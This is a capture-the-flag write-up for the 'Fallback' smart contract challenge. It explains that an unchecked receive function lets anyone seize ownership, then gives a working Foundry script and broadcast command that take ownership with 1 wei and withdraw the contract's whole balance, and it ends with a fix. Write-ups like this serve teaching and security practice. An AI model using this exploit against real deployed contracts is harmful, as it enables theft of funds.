# Fallback challenge writeup

## Challenge Description
This contract has various functions. `contribute` (sending ether to contract and increasing your contributions), if more than previous owner then you can become owner. `withdraw` function transfers all contract balance to owner. There is also `receive` function to get the ether which comes to the contract, this also executes code to become owner. The goal is to take all the balance of contract and also become the owner of contract.

## Vulnerability
`receive` function is not verifying whether contribution of msg.sender is greater than current owner or not. 

## Attack steps
1. Contribute very less(~1 wei) to have an account to send ether.
2. Send ether(~1 wei), so `receive` function is executed and owner will be changed.
3. Now execute `withdaw` function to drain all the ether from the contract.

## Exploit Code
Write a forge script to execute the attack

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;
import "@forge-std/Script.sol";
import {Fallback} from "../src/Fallback.sol";
contract FallbackScript is Script {
    Fallback public fallbackContract;

    function setUp() public {
        fallbackContract = Fallback(payable(vm.envAddress("FALLBACK_ADDRESS")));    
    }
    function run() public {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        fallbackContract.contribute{value: 1 wei}();
        (bool success,) = address(fallbackContract).call{value: 1 wei}("");
        require(success, "Can't send the ether");
        fallbackContract.withdraw();
        vm.stopBroadcast();
    }
}

```
Save all your environment variables(PRIVATE_KEY, CONTRACT_ADDRESS, RPC_URL) in `.env` file.

Then execute below command

`forge script script/Fallback.s.sol --tc FallbackScript -vvv --fork-url $RPC_URL --slow --broadcast`

## Recommendation
receive function can be changed accordingly

```solidity
receive() external payable {
    require(msg.value > 0 && contributions[msg.sender] > contributions[owner]);
    owner = msg.sender;
}
```